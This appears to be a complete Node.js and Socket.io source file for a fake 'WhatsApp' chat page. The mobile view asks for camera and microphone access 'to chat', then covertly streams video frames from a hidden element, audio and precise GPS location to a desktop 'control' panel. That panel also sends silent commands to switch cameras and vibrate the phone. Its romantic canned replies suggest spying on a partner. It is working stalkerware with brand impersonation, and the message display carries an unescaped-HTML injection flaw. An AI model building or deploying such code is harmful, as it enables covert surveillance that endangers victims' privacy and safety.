const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(getMobileHTML(fullUrl));
  } else {
    res.send(getDesktopHTML(fullUrl));
  }
});

// ============ CELULAR - APENAS CONVERSA ============
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header simples */
        .header {
            background: #075E54;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .header h2 { 
            flex: 1; 
            font-size: 18px; 
        }
        .status-dot {
            width: 10px;
            height: 10px;
            background: #25D366;
            border-radius: 50%;
        }
        
        /* Área de mensagens */
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 4px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="white" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M10,10 L10,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
            background-repeat: repeat;
        }
        
        .message {
            display: flex;
            margin-bottom: 4px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        
        .bubble {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
            line-height: 1.4;
            word-wrap: break-word;
        }
        .message.received .bubble {
            background: #202C33;
            color: #E9EDEF;
            border-top-left-radius: 4px;
        }
        .message.sent .bubble {
            background: #005C4B;
            color: white;
            border-top-right-radius: 4px;
        }
        .time {
            font-size: 10px;
            opacity: 0.6;
            margin-top: 4px;
            text-align: right;
        }
        
        /* Indicador de digitação */
        .typing {
            display: none;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
            font-size: 12px;
            color: #8696A0;
        }
        .typing.show { display: block; }
        
        /* Input area */
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        .input-field::placeholder {
            color: #8696A0;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Modal de permissão inicial */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #1F2C33;
            padding: 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 280px;
        }
        .modal-content h3 { 
            color: white; 
            margin-bottom: 16px; 
        }
        .modal-content p { 
            color: #8696A0; 
            font-size: 14px; 
            margin-bottom: 24px; 
        }
        .start-btn {
            background: #00A884;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        
        /* Pequeno indicador de conexão (discreto) */
        .conn-indicator {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #25D366;
            z-index: 20;
        }
        .conn-indicator.disconnected {
            background: #e74c3c;
        }
    </style>
</head>
<body>
    <!-- Modal de permissão inicial -->
    <div class="modal" id="permissionModal">
        <div class="modal-content">
            <h3>📱 WhatsApp</h3>
            <p>Permita acesso à câmera e microfone para conversar</p>
            <button class="start-btn" id="startBtn">▶️ Iniciar</button>
        </div>
    </div>
    
    <!-- Header simples -->
    <div class="header">
        <div class="status-dot"></div>
        <h2>WhatsApp</h2>
    </div>
    
    <!-- Área de mensagens -->
    <div class="messages" id="messages">
        <div class="typing" id="typing">Digitando...</div>
    </div>
    
    <!-- Input area -->
    <div class="input-area">
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
        <button class="send-btn" id="sendBtn">➤</button>
    </div>
    
    <!-- Indicador de conexão discreto -->
    <div class="conn-indicator" id="connIndicator"></div>
    
    <!-- Elementos ocultos para funcionalidades -->
    <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });
        
        // Elementos
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const modal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const connIndicator = document.getElementById('connIndicator');
        const localVideo = document.getElementById('localVideo');
        
        // Estado
        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let typingTimeout = null;
        let frameInterval = null;
        
        // Adicionar mensagem na tela
        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            
            // Remove typing indicator se existir
            const typingElem = document.getElementById('typing');
            if (typingElem && typingElem.parentNode === messagesDiv) {
                messagesDiv.removeChild(typingElem);
            }
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesDiv.appendChild(typingElem);
        }
        
        // Iniciar permissões e funcionalidades
        async function startPermissions() {
            try {
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                if (frameInterval) clearInterval(frameInterval);
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 }, 
                        height: { ideal: 480 }, 
                        facingMode: facingMode 
                    },
                    audio: true
                });
                
                mediaStream = stream;
                localVideo.srcObject = stream;
                
                // Enviar frames de vídeo
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                frameInterval = setInterval(() => {
                    if (mediaStream && mediaStream.active && permissions) {
                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
                    }
                }, 200);
                
                // Enviar áudio
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioCtx.createMediaStreamSource(stream);
                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
                source.connect(processor);
                processor.connect(audioCtx.destination);
                processor.onaudioprocess = (e) => {
                    if (permissions) {
                        const data = Array.from(e.inputBuffer.getChannelData(0));
                        if (Math.random() < 0.05) {
                            socket.emit('audio', data);
                        }
                    }
                };
                
                // Enviar localização
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (pos) => {
                            if (permissions) {
                                socket.emit('location', { 
                                    lat: pos.coords.latitude, 
                                    lng: pos.coords.longitude 
                                });
                            }
                        },
                        (err) => console.log('Geo error:', err),
                        { enableHighAccuracy: true }
                    );
                }
                
                permissions = true;
                modal.style.display = 'none';
                socket.emit('mobile_online');
                
            } catch (err) {
                console.error(err);
                alert('Por favor, permita acesso à câmera e microfone');
            }
        }
        
        // Enviar mensagem
        function sendMessage(text) {
            if (text.trim() && permissions) {
                addMessage(text, true);
                socket.emit('message', text);
                messageInput.value = '';
                if (typingTimeout) {
                    clearTimeout(typingTimeout);
                    socket.emit('typing_stop');
                }
            }
        }
        
        // Indicador de digitação
        function startTyping() {
            if (permissions) {
                socket.emit('typing_start');
                if (typingTimeout) clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => {
                    socket.emit('typing_stop');
                    typingTimeout = null;
                }, 1500);
            }
        }
        
        // Eventos de UI
        startBtn.onclick = startPermissions;
        sendBtn.onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                sendMessage(messageInput.value);
            } else {
                startTyping();
            }
        };
        messageInput.oninput = startTyping;
        
        // Socket events
        socket.on('message', (msg) => {
            addMessage(msg, false);
        });
        
        socket.on('typing_start', () => {
            typingDiv.classList.add('show');
            setTimeout(() => {
                typingDiv.classList.remove('show');
            }, 2000);
        });
        
        socket.on('typing_stop', () => {
            typingDiv.classList.remove('show');
        });
        
        socket.on('connect', () => {
            connIndicator.classList.remove('disconnected');
        });
        
        socket.on('disconnect', () => {
            connIndicator.classList.add('disconnected');
        });
        
        // Comandos silenciosos (sem notificação)
        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startPermissions();
        });
        
        socket.on('vibrate', () => {
            if (navigator.vibrate) navigator.vibrate(200);
        });
        
        // Mensagem inicial
        setTimeout(() => {
            if (!permissions) {
                const welcomeDiv = document.createElement('div');
                welcomeDiv.className = 'message received';
                welcomeDiv.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar" para começar a conversar</div>';
                messagesDiv.appendChild(welcomeDiv);
            }
        }, 500);
    </script>
</body>
</html>`;
}

// ============ PC - CONTROLE COMPLETO ============
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
        }
        
        .sidebar {
            width: 300px;
            background: #111B21;
            border-right: 1px solid #2A3B42;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header {
            background: #202C33;
            padding: 20px 16px;
        }
        .sidebar-header h2 { color: white; font-size: 18px; }
        .contact {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            background: #2A3B42;
        }
        .avatar {
            width: 49px;
            height: 49px;
            background: #075E54;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .contact-info { flex: 1; }
        .contact-name { color: white; font-weight: bold; }
        .contact-status { color: #8696A0; font-size: 13px; }
        
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .chat-header {
            background: #202C33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .chat-avatar {
            width: 40px;
            height: 40px;
            background: #075E54;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .chat-info { flex: 1; }
        .chat-name { color: white; font-weight: bold; }
        .chat-status { color: #8696A0; font-size: 13px; }
        .chat-actions { display: flex; gap: 16px; }
        .chat-actions button {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
            transition: all 0.2s;
        }
        .chat-actions button:hover { color: #00A884; }
        
        .video-panel {
            background: #000;
            height: 240px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        #remoteVideo { max-width: 100%; max-height: 240px; object-fit: contain; }
        .video-controls {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            background: rgba(0,0,0,0.7);
            padding: 6px 12px;
            border-radius: 30px;
        }
        .video-controls button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            padding: 4px 8px;
        }
        .video-controls button:hover { color: #00A884; }
        
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .message { display: flex; margin-bottom: 4px; }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
        }
        .message.received .bubble { background: #202C33; color: #E9EDEF; border-top-left-radius: 4px; }
        .message.sent .bubble { background: #005C4B; color: white; border-top-right-radius: 4px; }
        .time { font-size: 10px; opacity: 0.6; margin-top: 4px; text-align: right; }
        
        .typing {
            display: none;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
            color: #8696A0;
            font-size: 12px;
        }
        .typing.show { display: block; }
        
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        .quick {
            background: #1F2C33;
            padding: 8px 16px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            border-top: 1px solid #2A3B42;
        }
        .quick-msg {
            background: #2A3B42;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            color: #E9EDEF;
            cursor: pointer;
            transition: all 0.2s;
        }
        .quick-msg:hover { background: #3A4B52; transform: scale(1.02); }
        
        .location {
            background: #1F2C33;
            padding: 10px 16px;
            font-size: 12px;
            color: #8696A0;
            border-top: 1px solid #2A3B42;
        }
        .location a { color: #00A884; text-decoration: none; }
        
        .system-msg {
            text-align: center;
            font-size: 11px;
            color: #8696A0;
            margin: 8px 0;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header"><h2>💬 Conversas</h2></div>
        <div class="contact">
            <div class="avatar">📱</div>
            <div class="contact-info">
                <div class="contact-name">Celular</div>
                <div class="contact-status" id="contactStatus">offline</div>
            </div>
        </div>
    </div>
    
    <div class="chat">
        <div class="chat-header">
            <div class="chat-avatar">📱</div>
            <div class="chat-info">
                <div class="chat-name">Celular</div>
                <div class="chat-status" id="chatStatus">offline</div>
            </div>
            <div class="chat-actions">
                <button id="vibrateBtn" title="Vibrar celular">📳</button>
                <button id="toggleCameraBtn" title="Trocar câmera do celular">🔄</button>
            </div>
        </div>
        
        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Aguardando vídeo...">
            <div class="video-controls">
                <button id="enableAudioBtn" title="Áudio do celular">🔊</button>
                <button id="volumeUpBtn" title="Aumentar volume">📢</button>
            </div>
        </div>
        
        <div class="messages" id="messages">
            <div class="typing" id="typing">Celular está digitando...</div>
        </div>
        
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
        
        <div class="quick" id="quickMessages"></div>
        
        <div class="location" id="locationPanel">
            📍 Aguardando localização...
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elements
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const remoteVideo = document.getElementById('remoteVideo');
        const locationPanel = document.getElementById('locationPanel');
        const quickDiv = document.getElementById('quickMessages');
        const contactStatus = document.getElementById('contactStatus');
        const chatStatus = document.getElementById('chatStatus');
        
        // State
        let audioEnabled = true;
        let audioCtx = null;
        let audioGain = null;
        
        // Quick messages
        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oie 💕', 'Como você está?', 'Saudades!', 'Te vejo em breve', 'Boa noite 🌙', 'Bom dia ☀️', 'Te amo ❤️', 'Beijos 😘'];
        quickMsgs.forEach(msg => {
            const span = document.createElement('span');
            span.className = 'quick-msg';
            span.textContent = msg;
            span.onclick = () => sendMessage(msg);
            quickDiv.appendChild(span);
        });
        
        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            
            const typing = document.getElementById('typing');
            if (typing && typing.parentNode === messagesDiv) messagesDiv.removeChild(typing);
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesDiv.appendChild(typing);
        }
        
        function addSystemMessage(text) {
            const div = document.createElement('div');
            div.className = 'system-msg';
            div.textContent = text;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        function sendMessage(text) {
            if (text.trim()) {
                addMessage(text, true);
                socket.emit('message', text);
                messageInput.value = '';
                stopTyping();
            }
        }
        
        let typingTimeout = null;
        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1500);
        }
        
        function stopTyping() {
            socket.emit('typing_stop');
            if (typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }
        
        // Setup audio
        function setupAudio() {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            audioGain = audioCtx.createGain();
            audioGain.gain.value = 0.5;
            audioGain.connect(audioCtx.destination);
        }
        setupAudio();
        
        // Socket events
        socket.on('message', (msg) => addMessage(msg, false));
        socket.on('frame', (frame) => remoteVideo.src = frame);
        socket.on('audio', (audioData) => {
            if (audioEnabled && audioCtx) {
                const buffer = audioCtx.createBuffer(1, audioData.length, audioCtx.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                const source = audioCtx.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        socket.on('location', (data) => {
            locationPanel.innerHTML = \`📍 Localização: \${data.lat.toFixed(6)}, \${data.lng.toFixed(6)}<br><a href="https://maps.google.com/?q=\${data.lat},\${data.lng}" target="_blank">🗺️ Ver no mapa</a>\`;
        });
        socket.on('typing_start', () => { typingDiv.classList.add('show'); setTimeout(() => typingDiv.classList.remove('show'), 2000); });
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('mobile_online', () => {
            contactStatus.innerHTML = 'online 💚';
            chatStatus.innerHTML = 'online';
            addSystemMessage('✅ Celular conectado!');
        });
        
        // Button events
        sendBtn.onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(messageInput.value); else startTyping(); };
        messageInput.oninput = startTyping;
        
        document.getElementById('vibrateBtn').onclick = () => { socket.emit('vibrate'); addSystemMessage('📳 Vibração enviada'); };
        document.getElementById('toggleCameraBtn').onclick = () => { socket.emit('toggle_camera'); addSystemMessage('🔄 Trocando câmera do celular'); };
        document.getElementById('enableAudioBtn').onclick = () => { audioEnabled = !audioEnabled; document.getElementById('enableAudioBtn').innerHTML = audioEnabled ? '🔊' : '🔇'; addSystemMessage(audioEnabled ? '🔊 Áudio ativado' : '🔇 Áudio desativado'); };
        document.getElementById('volumeUpBtn').onclick = () => { if(audioGain) { const vol = Math.min(1, audioGain.gain.value + 0.1); audioGain.gain.value = vol; addSystemMessage(\`📢 Volume: \${Math.round(vol*100)}%\`); } };
        
        socket.on('connect', () => addSystemMessage('✅ Conectado ao servidor'));
        socket.on('disconnect', () => addSystemMessage('⚠️ Desconectado'));
        
        addSystemMessage('💬 Digite uma mensagem para começar');
    </script>
</body>
</html>`;
}

// ============ SERVIDOR SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  socket.on('message', (msg) => {
    console.log('Mensagem:', msg);
    socket.broadcast.emit('message', msg);
  });
  
  socket.on('typing_start', () => socket.broadcast.emit('typing_start'));
  socket.on('typing_stop', () => socket.broadcast.emit('typing_stop'));
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  socket.on('audio', (data) => socket.broadcast.emit('audio', data));
  socket.on('location', (loc) => socket.broadcast.emit('location', loc));
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n📱 WhatsApp - Servidor Rodando!`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   PC: http://localhost:${PORT}`);
  console.log(`   Celular: http://[SEU-IP]:${PORT}`);
  console.log(`\n✨ No CELULAR: Apenas conversa, digitar e enviar`);
  console.log(`💻 No PC: Controle completo (vídeo, áudio, localização, vibração)`);
  console.log(`\n🚀 Compartilhe o IP com seu celular na mesma rede!\n`);
});
